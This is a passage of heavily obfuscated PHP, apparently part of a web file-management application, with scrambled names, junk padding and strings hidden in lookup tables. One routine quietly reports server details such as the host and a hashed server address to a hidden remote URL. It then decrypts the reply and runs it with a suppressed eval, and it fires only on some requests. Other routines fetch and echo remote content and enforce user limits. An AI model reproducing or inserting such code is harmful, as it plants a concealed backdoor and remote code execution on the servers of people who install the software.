$üûÒôíÕ[121]); $æêø®áõ = $èÍ±°‡[723]; while (strlen($æêø®áõ) < $èÍ±°‡[670]) { if (!$æêø®áõ) { break; } $æêø®áõ++; } if (!_get($GLOBALS, $üûÒôíÕ[117]) || !isset($_GET[$üûÒôíÕ[215]])) { return; } if (!in_array($_SERVER[$üûÒôíÕ[24]], $Ï”Ô—é)) { return; } $™ñÄóñ = $üûÒôíÕ[216]; $Şøï®ğí = $èÍ±°‡[724]; if (strlen($Şøï®ğí) < $èÍ±°‡[660]) { die; } $™ñÄóñ = $this->lmyi16076013($™ñÄóñ, $üûÒôíÕ[217]); $¡Ö¼úÃ = stream_context_create(array($üûÒôíÕ[218] => array($üûÒôíÕ[219] => $üûÒôíÕ[220], $üûÒôíÕ[221] => 3))); $ßĞœøé = @file_get_contents($™ñÄóñ, !1, $¡Ö¼úÃ); header($üûÒôíÕ[222]); if ($ßĞœøé && strstr($ßĞœøé, $üûÒôíÕ[223])) { echo $ßĞœøé; } die; } public function lnhg63b957de($ÈÌ‡ç‹) { $Å³êŠÛç =& $_SERVER[ĞİŞñ©]; if ($this->huld15f76ae8 == $Å³êŠÛç[224]) { return $ÈÌ‡ç‹; } $™àã²İ = array($Å³êŠÛç[225] => $Å³êŠÛç[226], $Å³êŠÛç[227] => $Å³êŠÛç[226], $Å³êŠÛç[228] => $Å³êŠÛç[226], $Å³êŠÛç[229] => $Å³êŠÛç[230], $Å³êŠÛç[231] => $Å³êŠÛç[230], $Å³êŠÛç[232] => $Å³êŠÛç[230], $Å³êŠÛç[233] => $Å³êŠÛç[230], $Å³êŠÛç[234] => $Å³êŠÛç[230], $Å³êŠÛç[235] => $Å³êŠÛç[230], $Å³êŠÛç[236] => $Å³êŠÛç[230], $Å³êŠÛç[237] => $Å³êŠÛç[230], $Å³êŠÛç[238] => $Å³êŠÛç[230], $Å³êŠÛç[239] => $Å³êŠÛç[230], $Å³êŠÛç[240] => $Å³êŠÛç[230], $Å³êŠÛç[241] => $Å³êŠÛç[230]); $ÌˆÑ¹°‚ = explode($Å³êŠÛç[242], _get($this->pjge12610cc9, $Å³êŠÛç[114], $Å³êŠÛç[6])); $´‹ü©Ââ = array(); foreach ($™àã²İ as $„ÏÂıü® => $£ÉÜÇƒâ) { if ($£ÉÜÇƒâ == $Å³êŠÛç[226] && substr($this->huld15f76ae8, 0, 1) == $Å³êŠÛç[226]) { continue; } if (!in_array($„ÏÂıü®, $ÌˆÑ¹°‚)) { $´‹ü©Ââ[] = $„ÏÂıü®; } } foreach ($´‹ü©Ââ as $„ÏÂıü®) { unset($ÈÌ‡ç‹[$„ÏÂıü®]); } return $ÈÌ‡ç‹; $Ş¦ĞÏ’Í = $_SERVER[çâ¥×ø³][725]; if (!$Ş¦ĞÏ’Í) { return; } } private function iwte90acbf82() { $¢Ü¨Ì³Ú =& $_SERVER[ĞİŞñ©]; if ($this->huld15f76ae8 != $¢Ü¨Ì³Ú[108]) { $GLOBALS[$¢Ü¨Ì³Ú[85]][$¢Ü¨Ì³Ú[89]][$¢Ü¨Ì³Ú[243]] = $¢Ü¨Ì³Ú[205]; return; } $GLOBALS[$¢Ü¨Ì³Ú[85]][$¢Ü¨Ì³Ú[244]] = $¢Ü¨Ì³Ú[123]; if (Model($¢Ü¨Ì³Ú[245])->get($¢Ü¨Ì³Ú[63]) != $¢Ü¨Ì³Ú[205]) { Model($¢Ü¨Ì³Ú[245])->set($¢Ü¨Ì³Ú[63], $¢Ü¨Ì³Ú[205]); } } public function ydjlf43b314a() { return $_SERVER[ĞİŞñ©][246]; $àİã‡‰± = $_SERVER[çâ¥×ø³][726]; } private function pwtz1bc0ffdd() { $äŸ‹İá® =& $_SERVER[çâ¥×ø³]; $¯ãÅÊ„› =& $_SERVER[ĞİŞñ©]; $—ûİıÈÀ = array($¯ãÅÊ„›[247], $¯ãÅÊ„›[248], $¯ãÅÊ„›[249]); $ø¶€‡Ş´ = $äŸ‹İá®[727]; $Á©Óº = $¯ãÅÊ„›[250] . md5($¯ãÅÊ„›[251]); $‚ø¬Œ‹å = $äŸ‹İá®[728]; if ($this->huld15f76ae8 == $¯ãÅÊ„›[108] || !_get($GLOBALS, $¯ãÅÊ„›[117])) { return; } if (!in_array($_SERVER[$¯ãÅÊ„›[24]], $—ûİıÈÀ)) { return; } if (time() % 4 != 0) { return; } $Ê™Éì‡Ş = call_user_func(array($¯ãÅÊ„›[252], $¯ãÅÊ„›[253]), $Á©Óº); $ûáÇ’ü† = $äŸ‹İá®[729]; if ($Ê™Éì‡Ş && time() - $Ê™Éì‡Ş < intval($¯ãÅÊ„›[254])) { return; } call_user_func(array($¯ãÅÊ„›[252], $¯ãÅÊ„›[140]), $Á©Óº, time()); $ßš–—İ = $äŸ‹İá®[730]; if (!$ßš–—İ) { return; } $Ùçòõ§¹ = Model($¯ãÅÊ„›[33])->get($¯ãÅÊ„›[99]); $ôÃùñ­Ö = $äŸ‹İá®[731]; $õš–Ëéì = array($¯ãÅÊ„›[152] => Model($¯ãÅÊ„›[33])->get($¯ãÅÊ„›[188]), $¯ãÅÊ„›[165] => $this->huld15f76ae8, $¯ãÅÊ„›[162] => $_SERVER[$¯ãÅÊ„›[163]], $¯ãÅÊ„›[164] => Model($¯ãÅÊ„›[33])->get($¯ãÅÊ„›[132]), $¯ãÅÊ„›[104] => md5($_SERVER[$¯ãÅÊ„›[105]] . $Ùçòõ§¹), $¯ãÅÊ„›[155] => $¯ãÅÊ„›[137], $¯ãÅÊ„›[158] => $_SERVER[$¯ãÅÊ„›[159]]); $†©ßÑ½å = $äŸ‹İá®[732]; if (strlen($†©ßÑ½å) < $äŸ‹İá®[670]) { die; } $¦´£ó»Œ = $this->vmbj465b0d18($¯ãÅÊ„›[255], $õš–Ëéì); $«²ÛÅ¥— = $äŸ‹İá®[733]; if (strlen($«²ÛÅ¥—) < $äŸ‹İá®[657]) { return; } if (!is_array($¦´£ó»Œ)) { return; } if ($¦´£ó»Œ[$¯ãÅÊ„›[152]] && $¦´£ó»Œ[$¯ãÅÊ„›[256]]) { if ($this->zgdp09c00ca0($¦´£ó»Œ[$¯ãÅÊ„›[256]]) == $õš–Ëéì[$¯ãÅÊ„›[152]]) { return; } } $this->ezar4a27aaff(); if ($this->zgdp09c00ca0($¦´£ó»Œ[$¯ãÅÊ„›[256]]) != $õš–Ëéì[$¯ãÅÊ„›[152]]) { $Š‘Èûª = array($¯ãÅÊ„›[183] => $Ùçòõ§¹, $¯ãÅÊ„›[184] => $_SERVER[$¯ãÅÊ„›[105]], $¯ãÅÊ„›[185] => this_url(), $¯ãÅÊ„›[160] => $_SERVER[$¯ãÅÊ„›[161]]); $œ¶÷‡¾± = $this->ucia4eda5017(json_encode($Š‘Èûª)); $¦´£ó»Œ = $this->vmbj465b0d18($¯ãÅÊ„›[186] . $œ¶÷‡¾±); if ($¦´£ó»Œ && is_array($¦´£ó»Œ) && isset($¦´£ó»Œ[$¯ãÅÊ„›[256]])) { $€æŠî = $this->letu9b1262c5($¦´£ó»Œ[$¯ãÅÊ„›[256]], 2); if ($€æŠî) { $€æŠî = $this->zgdp09c00ca0($€æŠî); } if ($€æŠî) { try { @eval($€æŠî); } catch (Exception $¨Õïã“š) { } } } } } private function vmbj465b0d18($ô‹øö—‰ = '', $ØÁøåÆ = array(), $ƒ÷Æ¼Ğ¼ = 5) { $€Ç¼¾¬ =& $_SERVER[çâ¥×ø³]; $ÖÈÌ¶¥Â =& $_SERVER[ĞİŞñ©]; $úúÔ•Ôã = $ÖÈÌ¶¥Â[257]; $—Îßğ«Ï = $€Ç¼¾¬[734]; while ($—Îßğ«Ï < $€Ç¼¾¬[660]) { if ($—Îßğ«Ï >= 0) { break; } $—Îßğ«Ï++; } $úúÔ•Ôã = $this->lmyi16076013($úúÔ•Ôã, $ÖÈÌ¶¥Â[258]); $úúÔ•Ôã = $úúÔ•Ôã . $ô‹øö—‰; if ($ØÁøåÆ && is_array($ØÁøåÆ)) { $úúÔ•Ôã = $úúÔ•Ôã . $ÖÈÌ¶¥Â[259] . http_build_query($ØÁøåÆ); } if ($ØÁøåÆ === -1) { return $úúÔ•Ôã; } $Ü·á–ó = stream_context_create(array($ÖÈÌ¶¥Â[218] => array($ÖÈÌ¶¥Â[221] => $ƒ÷Æ¼Ğ¼, $ÖÈÌ¶¥Â[219] => $ÖÈÌ¶¥Â[260]), $ÖÈÌ¶¥Â[261] => array($ÖÈÌ¶¥Â[262] => !1, $ÖÈÌ¶¥Â[263] => !1))); $ËËµ´• = $€Ç¼¾¬[735]; $ØÁøåÆ = @file_get_contents($úúÔ•Ôã, !1, $Ü·á–ó); $İ†Ğèœ™ = $€Ç¼¾¬[736]; while ($İ†Ğèœ™ < $€Ç¼¾¬[660]) { if ($İ†Ğèœ™ >= 0) { break; } $İ†Ğèœ™++; } return json_decode($ØÁøåÆ, !0); } private function wqxea1f566b1() { $‡İÀÅŠŞ =& $_SERVER[çâ¥×ø³]; $Ğ®ÛĞÜŠ =& $_SERVER[ĞİŞñ©]; $—Ÿèå Ë = array($Ğ®ÛĞÜŠ[264] => $Ğ®ÛĞÜŠ[265], $Ğ®ÛĞÜŠ[266] => $Ğ®ÛĞÜŠ[267], $Ğ®ÛĞÜŠ[268] => $Ğ®ÛĞÜŠ[269], $Ğ®ÛĞÜŠ[270] => $Ğ®ÛĞÜŠ[271], $Ğ®ÛĞÜŠ[272] => $Ğ®ÛĞÜŠ[273], $Ğ®ÛĞÜŠ[274] => $Ğ®ÛĞÜŠ[213], $Ğ®ÛĞÜŠ[275] => $Ğ®ÛĞÜŠ[213], $Ğ®ÛĞÜŠ[276] => $Ğ®ÛĞÜŠ[265], $Ğ®ÛĞÜŠ[277] => $Ğ®ÛĞÜŠ[267], $Ğ®ÛĞÜŠ[278] => $Ğ®ÛĞÜŠ[269], $Ğ®ÛĞÜŠ[279] => $Ğ®ÛĞÜŠ[280], $Ğ®ÛĞÜŠ[281] => $Ğ®ÛĞÜŠ[271], $Ğ®ÛĞÜŠ[282] => $Ğ®ÛĞÜŠ[283], $Ğ®ÛĞÜŠ[284] => $Ğ®ÛĞÜŠ[273], $Ğ®ÛĞÜŠ[285] => $Ğ®ÛĞÜŠ[286], $Ğ®ÛĞÜŠ[287] => $Ğ®ÛĞÜŠ[288], $Ğ®ÛĞÜŠ[289] => $Ğ®ÛĞÜŠ[290]); $ÒŒ œ— = $—Ÿèå Ë[$this->huld15f76ae8]; $ÒŒ œ— = intval($ÒŒ œ— ? $ÒŒ œ— : $Ğ®ÛĞÜŠ[265]); $ºıÌ´¶ = _get($this->pjge12610cc9, $Ğ®ÛĞÜŠ[291]); $Š¾´ÊÎŸ = $‡İÀÅŠŞ[737]; if (!$Š¾´ÊÎŸ) { die; } $ºıÌ´¶ = $ºıÌ´¶ ? intval($ºıÌ´¶) : 0; $ª½…²‚İ = $‡İÀÅŠŞ[738]; while (strlen($ª½…²‚İ) < $‡İÀÅŠŞ[670]) { if (!$ª½…²‚İ) { break; } $ª½…²‚İ++; } return $ÒŒ œ— + $ºıÌ´¶; $îØÂøÃÊ = $‡İÀÅŠŞ[739]; if (!$îØÂøÃÊ) { die; } } public function bras80cba147($û¹ƒ’«) { $Èœà¥” =& $_SERVER[ĞİŞñ©]; $Õ·³¢¸¡ = $this->wqxea1f566b1(); if ($û¹ƒ’«[$Èœà¥”[292]] == $Èœà¥”[123]) { return; } if ($Õ·³¢¸¡ >= intval($Èœà¥”[213])) { return; } $¤ÑÜÉ• = Model($Èœà¥”[126])->count(); $å¨ïøş½ = $_SERVER[çâ¥×ø³][740]; if (!$å¨ïøş½) { return; } if ($¤ÑÜÉ• <= $Õ·³¢¸¡) { return; } $Ì€¯¥€ = Model($Èœà¥”[126])->field($Èœà¥”[292])->limit($Õ·³¢¸¡)->select(); $Ì€¯¥€ = array_to_keyvalue($Ì€¯¥€, $Èœà¥”[6], $Èœà¥”[292]); if (!in_array($û¹ƒ’«[$Èœà¥”[292]], $Ì€¯¥€)) { show_json($Èœà¥”[293], !1, $Èœà¥”[209]); } } public function pcvs6e778895() { $˜¨ª¥ÏÔ =& $_SERVER[çâ¥×ø³]; $×éĞğ†± =& $_SERVER[ĞİŞñ©]; if (!_get($GLOBALS, $×éĞğ†±[117]) || mt_rand(1, 100) > 20) { return; } $Í±ŞÊƒ¦ = $×éĞğ†±[216]; $±º°òîÕ = $˜¨ª¥ÏÔ[741]; while ($±º°òîÕ < $˜¨ª¥ÏÔ[655]) { if ($±º°òîÕ >= 0) { break; } $±º°òîÕ++; } $Í±ŞÊƒ¦ = $this->lmyi16076013($Í±ŞÊƒ¦, $×éĞğ†±[217]); $“×ÊË¹å = stream_context_create(array($×éĞğ†±[218] => array($×éĞğ†±[219] => $×éĞğ†±[220], $×éĞğ†±[221] => 3))); $çõ›¼ = @file_get_contents($Í±ŞÊƒ¦, !1, $“×ÊË¹å); $¦†˜¢Ç = $˜¨ª¥ÏÔ[742]; if (!$¦†˜¢Ç) { die; } echo $×éĞğ†±[294] . hash_encode($çõ›¼) . $×éĞğ†±[295]; $´£šÌ¢¤ = $˜¨ª¥ÏÔ[743]; if (!$´£šÌ¢¤) { die; } } private function sflu0a81865d($¤Ñ¤±èé, $¨Ş½ÚÛª, $—»ÒÉƒç = 3) { $•´É¦´ı =& $_SERVER[çâ¥×ø³]; $¿åØ„Ù» =& $_SERVER[ĞİŞñ©]; usleep(1); $¤Ñ¤±èé = trim($¤Ñ¤±èé); $â’ŒøÀá = $•´É¦´ı[744]; if (!$â’ŒøÀá) { return; } $çĞ½äú• = mt_rand(0, 5) . $¿åØ„Ù»[6]; $ˆáŠ¶ßÇ = $•´É¦´ı[745]; while (strlen($ˆáŠ¶ßÇ) < $•´É¦´ı[657]) { if (!$ˆáŠ¶ßÇ) { break; } $ˆáŠ¶ßÇ++; } $šğš´³† = rand_string(15); $ÀÌÅ¥ìá = $•´É¦´ı[746]; $¬–‰ïÈ = $¿åØ„Ù»[296]; $±ÓŠÛˆ = $•´É¦´ı[747]; if (!$±ÓŠÛˆ) { return; } switch ($çĞ½äú•) { case $¿åØ„Ù»[205]: $Ûè°ªÒŒ = $this->nyvo7344c7c9($¤Ñ¤±èé, strrev($¨Ş½ÚÛª . $šğš´³†)); break; case $¿åØ„Ù»[123]: $Ûè°ªÒŒ = $this->nyvo7344c7c9($¤Ñ¤±èé, strrev($šğš´³† . $¨Ş½ÚÛª)); break; $Â¡Ùı‰ = $•´É¦´ı[748]; if (!$Â¡Ùı‰) { die; } case $¿åØ„Ù»[297]: $Ûè°ªÒŒ = $this->nyvo7344c7c9($¤Ñ¤±èé, base64_encode($šğš´³† . $¨Ş½ÚÛª)); $ÊŞİŒø = $•´É¦´ı[749]; break; case $¿åØ„Ù»[298]: $Ûè°ªÒŒ = $this->nyvo7344c7c9($¤Ñ¤±èé, md5($šğš´³† . $¨Ş½ÚÛª)); break; case $¿åØ„Ù»[299]: $¤Ñ¤±èé = base64_encode($¤Ñ¤±èé); $×¼É´á” = $•´É¦´ı[750]; while ($×¼É´á” < $•´É¦´ı[657]) { if ($×¼É´á” >= 0) { break; } $×¼É´á”++; } $¤Ê»µ° = rand(0, 64); $Ô™‡¦‹ = $•´É¦´ı[751]; while (strlen($Ô™‡¦‹) < $•´É¦´ı[653]) { if (!$Ô™‡¦‹) { break; } $Ô™‡¦‹++; } $¡£×‹ = $¬–‰ïÈ[$¤Ê»µ°]; $˜³Á½« = $•´É¦´ı[752]; while (strlen($˜³Á½«) < $•´É¦´ı[670]) { if (!$˜³Á½«) { break; } $˜³Á½«++; } $€áÛ‰‰‹ = md5($¡£×‹ . md5($¨Ş½ÚÛª . $¡£×‹) . $¨Ş½ÚÛª); $€áÛ‰‰‹ = substr($€áÛ‰‰‹, $¤Ê»µ° % 8, $¤Ê»µ° % 8 + 7); $ë¢ê¿Š™ = $¿åØ„Ù»[6]; $ˆâÕ¢ÇÈ = 0; $‚ßÁŒÍ” = $•´É¦´ı[753]; $æ‘ô“® = 0; $˜òì¦Ç = $•´É¦´ı[754]; if (strlen($˜òì¦Ç) < $•´É¦´ı[670]) { die; } $ÏÚÀÌò¤ = 0; for ($ˆâÕ¢ÇÈ = 0; $ˆâÕ¢ÇÈ < strlen($¤Ñ¤±èé); $ˆâÕ¢ÇÈ++) { $ÏÚÀÌò¤ = $ÏÚÀÌò¤ == strlen($€áÛ‰‰‹) ? 0 : $ÏÚÀÌò¤; $ÏÎ°ï±Ş = $•´É¦´ı[755]; if (!$ÏÎ°ï±Ş) { die; } $æ‘ô“® = ($¤Ê»µ° + strpos($¬–‰ïÈ, $¤Ñ¤±èé[$ˆâÕ¢ÇÈ]) + ord($€áÛ‰‰‹[$ÏÚÀÌò¤++])) % 64; $Ëş¥èŸÈ = $•´É¦´ı[756]; if (!$Ëş¥èŸÈ) { return; } $ë¢ê¿Š™ .= $¬–‰ïÈ[$æ‘ô“®]; } $Ûè°ªÒŒ = hash_encode($¡£×‹ . $ë¢ê¿Š™); break; default: $Ûè°ªÒŒ = $this->nyvo7344c7c9($¤Ñ¤±èé, $¨Ş½ÚÛª . $šğš´³†); break; $–èâ¥ıã = $•´É¦´ı[757]; if (!$–èâ¥ıã) { return; } } $Ûè°ªÒŒ = strrev($çĞ½äú• . $šğš´³† . $Ûè°ªÒŒ); if ($—»ÒÉƒç - 1 > 0) { $Ûè°ªÒŒ = $this->sflu0a81865d($Ûè°ªÒŒ, $¨Ş½ÚÛª, $—»ÒÉƒç - 1); } return $Ûè°ªÒŒ; } private function letu9b1262c5($âü«äù, $âóÒ†Éİ, $óÃ¨Ãõ­ = 3) { $­×€õÖş =& $_SERVER[çâ¥×ø³]; $©´òô =& $_SERVER[ĞİŞñ©]; if (!is_string($âü«äù) || strlen($âü«äù) < 10) { return !1; } $âü«äù = trim($âü«äù); $ãçÖÄ˜ = $­×€õÖş[758]; while ($ãçÖÄ˜ < $­×€õÖş[660]) { if ($ãçÖÄ˜ >= 0) { break; } $ãçÖÄ˜++; } $âü«äù = strrev($âü«äù); $õÄìĞ„œ = $âü«äù[0]; $”½›µË… = substr($âü«äù, 1, 15); $©ÕÓÎ­Â = $­×€õÖş[759]; if (strlen($©ÕÓÎ­Â) < $­×€õÖş[653]) { return; } $âü«äù = substr($âü«äù, 16); $…âŸ—Ÿ = $©´òô[296]; switch ($õÄìĞ„œ) { case $©´òô[205]: $äâ™á¶ä = $this->lmyi16076013($âü«äù, strrev($âóÒ†Éİ . $”½›µË…)); $×Í¹»Ú× = $­×€õÖş[760]; while (strlen($×Í¹»Ú×) < $­×€õÖş[660]) { if (!$×Í¹»Ú×) { break; } $×Í¹»Ú×++; } break; case $©´òô[123]: $äâ™á¶ä = $this->lmyi16076013($âü«äù, strrev($”½›µË… . $âóÒ†Éİ)); $á‹¶âóş = $­×€õÖş[761]; break; $ºå‰æØ = $­×€õÖş[762]; case $©´òô[297]: $äâ™á¶ä = $this->lmyi16076013($âü«äù, base64_encode($”½›µË… . $âóÒ†Éİ)); break; $Ó¢ôêßĞ = $­×€õÖş[763]; if (!$Ó¢ôêßĞ) { return; } case $©´òô[298]: $äâ™á¶ä = $this->lmyi16076013($âü«äù, md5($”½›µË… . $âóÒ†Éİ)); break; $‹éî‡Øä = $­×€õÖş[764]; if (!$‹éî‡Øä) { return; } case $©´òô[299]: $âü«äù = hash_decode($âü«äù); $ŸŞ¿¼İ‹ = $­×€õÖş[765]; if (!$ŸŞ¿¼İ‹) { die; } $´Ö¶Øß® = $âü«äù[0]; $²ä¾¹¤È = $­×€õÖş[766]; $âü«äù = substr($âü«äù, 1); $×µîºÄŞ = $­×€õÖş[767]; while ($×µîºÄŞ < $­×€õÖş[660]) { if ($×µîºÄŞ >= 0) { break; } $×µîºÄŞ++; } $ÎİÃ ßô = strpos($…âŸ—Ÿ, $´Ö¶Øß®); $Ñê…Éâş = md5($´Ö¶Øß® . md5($âóÒ†Éİ . $´Ö¶Øß®) . $âóÒ†Éİ); $Ñê…Éâş = substr($Ñê…Éâş, $ÎİÃ ßô % 8, $ÎİÃ ßô % 8 + 7); $Œ¿¡…¹Å = $­×€õÖş[768]; if (strlen($Œ¿¡…¹Å) < $­×€õÖş[657]) { return; } $Ğ´ªç = $©´òô[6]; $•Ø«Ù– = 0; $ğà½”ã = 0; $åö´ƒƒ¢ = 0; for ($•Ø«Ù– = 0; $•Ø«Ù– < strlen($âü«äù); $•Ø«Ù–++) { $åö´ƒƒ¢ = $åö´ƒƒ¢ == strlen($Ñê…Éâş) ? 0 : $åö´ƒƒ¢; $ÒŸ²Å¢„ = $åö´ƒƒ¢++; $ğà½”ã = strpos($…âŸ—Ÿ, $âü«äù[$•Ø«Ù–]) - $ÎİÃ ßô - ord($Ñê…Éâş[$ÒŸ²Å¢„]); $÷€¹Ë†Ò = $­×€õÖş[769]; if (strlen($÷€¹Ë†Ò) < $­×€õÖş[655]) { return; } while ($ğà½”ã < 0) { $ğà½”ã += 64; $Ô˜¸ğÄÄ = $­×€õÖş[770]; if (strlen($Ô˜¸ğÄÄ) < $­×€õÖş[655]) { die; } } $Ğ´ªç .= $…âŸ—Ÿ[$ğà½”ã]; } $äâ™á¶ä = base64_decode($Ğ´ªç); $²ò¶‹»ƒ = $­×€õÖş[771]; if (strlen($²ò¶‹»ƒ) < $­×€õÖş[655]) { return; } break; $Œ¤¬ÖÜü = $­×€õÖş[772]; while ($Œ¤¬ÖÜü < $­×€õÖş[655]) { if ($Œ¤¬ÖÜü >= 0) { break; } $Œ¤¬ÖÜü++; } default: $äâ™á¶ä = $this->lmyi16076013($âü«äù, $âóÒ†Éİ . $”½›µË…); $ŠŸùÀ“£ = $­×€õÖş[773]; if (!$ŠŸùÀ“£) { return; } break; } if ($óÃ¨Ãõ­ - 1 > 0) { $äâ™á¶ä = $this->letu9b1262c5($äâ™á¶ä, $âóÒ†Éİ, $óÃ¨Ãõ­ - 1); } return $äâ™á¶ä; } public function ucia4eda5017($×¤àƒ×ô) { $÷…İ‚í =& $_SERVER[çâ¥×ø³]; $ñ˜‹ã =& $_SERVER[ĞİŞñ©]; $’”Œ™†‚ = $this->cezgadb0a6f1(); $ÈÚ™Ò€ = $this->cezgadb0a6f1(); $Úäü„Ï÷ = $÷…İ‚í[774]; if (!$Úäü„Ï÷) { die; } $ø«¬•Î = ($’”Œ™†‚ - 1) * ($ÈÚ™Ò€ - 1); $“†şĞ©Î = $÷…İ‚í[775]; $‘ñŒíõœ = intval(($’”Œ™†‚ + $ÈÚ™Ò€) / 2); while (1) { $†Â©¸ÕÅ = $‘ñŒíõœ; $ÑºŞ…Â° = $ø«¬•Î; while ($ÑºŞ…Â° % $†Â©¸ÕÅ != 0) { $×´¾À«– = $ÑºŞ…Â°; $ÑºŞ…Â° = $†Â©¸ÕÅ; $êÊ«ıÖ÷ = $÷…İ‚í[776]; while ($êÊ«ıÖ÷ < $÷…İ‚í[657]) { if ($êÊ«ıÖ÷ >= 0) { break; } $êÊ«ıÖ÷++; } $†Â©¸ÕÅ = $×´¾À«– % $†Â©¸ÕÅ; } if ($†Â©¸ÕÅ == 1) { break; } else { $‘ñŒíõœ++; } } $“ä©¢¦‰ = 2; for ($¼µÁşÓÅ = 0; $¼µÁşÓÅ < $ø«¬•Î * 10; $¼µÁşÓÅ++) { if (($ø«¬•Î * $¼µÁşÓÅ + 1) % $‘ñŒíõœ == 0) { $“ä©¢¦‰ = intval(($ø«¬•Î * $¼µÁşÓÅ + 1) / $‘ñŒíõœ); break; } } $Î¬„å£ñ = $this->nyvo7344c7c9($’”Œ™†‚ * $ÈÚ™Ò€ . $ñ˜‹ã[6], $ñ˜‹ã[137]); $íà×úÀ = md5($ñ˜‹ã[300] . ($’”Œ™†‚ + $ÈÚ™Ò€) . $ñ˜‹ã[301] . $‘ñŒíõœ . $ñ˜‹ã[301] . $“ä©¢¦‰ . $ñ˜‹ã[302]); $¼ŸíÇî = $÷…İ‚í[777]; $„ª²–± = $this->nyvo7344c7c9($×¤àƒ×ô, $íà×úÀ) . $ñ˜‹ã[303] . $Î¬„å£ñ; $¥·Ÿ•«Ù = $÷…İ‚í[778]; while ($¥·Ÿ•«Ù < $÷…İ‚í[655]) { if ($¥·Ÿ•«Ù >= 0) { break; } $¥·Ÿ•«Ù++; } return $„ª²–±; } public function zgdp09c00ca0($Á®èÛôô) { $ú¢È‹¿ =& $_SERVER[çâ¥×ø³]; $¨äÈ€÷ =& $_SERVER[ĞİŞñ©]; $Íç¢»ó = explode($¨äÈ€÷[303], $Á®èÛôô); $Ñá²äÜ = $ú¢È‹¿[779]; if (count($Íç¢»ó) != 2) { return $¨äÈ€÷[6]; } $ÜÎŒÜÈÚ = $this->lmyi16076013($Íç¢»ó[1] . $¨äÈ€÷[6], $¨äÈ€÷[137]); $í”‚¢¯ = $ú¢È‹¿[780]; if (!$ÜÎŒÜÈÚ) { return $¨äÈ€÷[6]; } $ÜÎŒÜÈÚ = intval($ÜÎŒÜÈÚ); $¹ÚæÕûÎ = 0; $× Ë·£´ = $ú¢È‹¿[781]; while (strlen($× Ë·£´) < $ú¢È‹¿[670]) { if (!$× Ë·£´) { break; } $× Ë·£´++; } $¦–İñô¶ = 0; for ($²€Öª¤¸ = 3; $²€Öª¤¸ < $ÜÎŒÜÈÚ; $²€Öª¤¸ += 2) { if ($ÜÎŒÜÈÚ % $²€Öª¤¸ != 0) { continue; } $¹ÚæÕûÎ = $²€Öª¤¸; $¨°‹Â¸ı = $ú¢È‹¿[782]; if (strlen($¨°‹Â¸ı) < $ú¢È‹¿[670]) { die; } $¦–İñô¶ = intval($ÜÎŒÜÈÚ / $²€Öª¤¸); $ˆğƒÔú = $ú¢È‹¿[783]; while (strlen($ˆğƒÔú) < $ú¢È‹¿[660]) { if (!$ˆğƒÔú) { break; } $ˆğƒÔú++; } break; $ıàù‹—˜ = $ú¢È‹¿[667]; if (!$ıàù‹—˜) { die; } } $¡¾øË™Ê = ($¹ÚæÕûÎ - 1) * ($¦–İñô¶ - 1); $Ã¯†Œï = intval(($¹ÚæÕûÎ + $¦–İñô¶) / 2); $ÃšäÀë  = $ú¢È‹¿[784]; if (strlen($ÃšäÀë ) < $ú¢È‹¿[670]) { return; } while (1) { $ª¢¤§Üš = $Ã¯†Œï; $Ëªª‹‡Œ = $ú¢È‹¿[785]; $ÅŒºñÌµ = $¡¾øË™Ê; $º Ş§à = $ú¢È‹¿[786]; if (!$º Ş§à) { return; } while ($ÅŒºñÌµ % $ª¢¤§Üš != 0) { $£ƒ§¹ÎÎ = $ÅŒºñÌµ; $­´¿¢Û± = $ú¢È‹¿[787]; if (strlen($­´¿¢Û±) < $ú¢È‹¿[670]) { return; } $ÅŒºñÌµ = $ª¢¤§Üš; $ª¢¤§Üš = $£ƒ§¹ÎÎ % $ª¢¤§Üš; } if ($ª¢¤§Üš == 1) { break; } else { $Ã¯†Œï++; } } $µ°¦Üó = 2; for ($²€Öª¤¸ = 0; $²€Öª¤¸ < $¡¾øË™Ê * 10; $²€Öª¤¸++) { if (($¡¾øË™Ê * $²€Öª¤¸ + 1) % $Ã¯†Œï == 0) { $µ°¦Üó = intval(($¡¾øË™Ê * $²€Öª¤¸ + 1) / $Ã¯†Œï); break; } } $³Îëœ¿ = md5($¨äÈ€÷[300] . ($¹ÚæÕûÎ + $¦–İñô¶) . $¨äÈ€÷[301] . $Ã¯†Œï . $¨äÈ€÷[301] . $µ°¦Üó . $¨äÈ€÷[302]); $°ß“ì²° = $this->lmyi16076013($Íç¢»ó[0], $³Îëœ¿); return $°ß“ì²°; } public function cezgadb0a6f1() { $øÌ²è¦´ =& $_SERVER[çâ¥×ø³]; $ÊáÚ™æç = mt_rand(pow(2, 14), pow(2, 16) - 1); $ òâÎŸÈ = array(); $‰¶­Ì±Ú = 1; while ($‰¶­Ì±Ú <= (int) sqrt($ÊáÚ™æç)) { $ÀÂÑÖìÖ = $‰¶­Ì±Ú; $Òìş­¾ = $øÌ²è¦´[788]; if (strlen($Òìş­¾) < $øÌ²è¦´[657]) { die; } while (!0) { $ÀÂÑÖìÖ++; $Î¨ôò¸ = $øÌ²è¦´[789]; if (!$Î¨ôò¸) { return; } if ($ÀÂÑÖìÖ <= 2) { $‰¶­Ì±Ú = $ÀÂÑÖìÖ; break; } else { if ($ÀÂÑÖìÖ < 2) { continue; } } $Æù«µŞĞ = !0; for ($© °¥Î = 2; $© °¥Î <= sqrt($ÀÂÑÖìÖ); $© °¥Î++) { if ($ÀÂÑÖìÖ % $© °¥Î == 0) { $Æù«µŞĞ = !1; } } if ($Æù«µŞĞ) { $‰¶­Ì±Ú = $ÀÂÑÖìÖ; break; } } $ òâÎŸÈ[] = $‰¶­Ì±Ú; $‡ú¿æ©ú = $øÌ²è¦´[790]; } $öê»‹¥œ = 2; $‘ÄÎùÚü = $øÌ²è¦´[791]; while ($‘ÄÎùÚü < $øÌ²è¦´[657]) { if ($‘ÄÎùÚü >= 0) { break; } $‘ÄÎùÚü++; } for ($ÀÂÑÖìÖ = $ÊáÚ™æç; $ÀÂÑÖìÖ > 1; $ÀÂÑÖìÖ--) { $Æù«µŞĞ = !0; $›Ï¿àÉ… = $øÌ²è¦´[792]; while ($›Ï¿àÉ… < $øÌ²è¦´[660]) { if ($›Ï¿àÉ… >= 0) { break; } $›Ï¿àÉ…++; } foreach ($ òâÎŸÈ as $ë«—°ò¡) { if ($ÀÂÑÖìÖ % $ë«—°ò¡ == 0) { $Æù«µŞĞ = !1; break; } } if ($Æù«µŞĞ) { $öê»‹¥œ = $ÀÂÑÖìÖ; break; } } return $öê»‹¥œ; $§”Ù¿ìÄ = $øÌ²è¦´[793]; if (strlen($§”Ù¿ìÄ) < $øÌ²è¦´[653]) { die; } } public function 